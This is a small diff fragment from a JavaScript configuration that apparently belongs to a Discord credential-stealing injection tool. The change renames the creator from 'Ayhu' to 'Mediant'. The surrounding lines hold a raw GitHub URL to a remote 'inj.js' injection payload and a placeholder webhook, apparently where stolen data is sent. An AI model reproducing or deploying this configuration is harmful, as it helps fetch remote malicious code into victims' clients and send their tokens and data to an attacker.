@@ -17,7 +17,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 2895667,
 
-    creator: "Ayhu",
+    creator: "Mediant",
     transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/inj.js",
     webhook: "%WEBHOOK%",
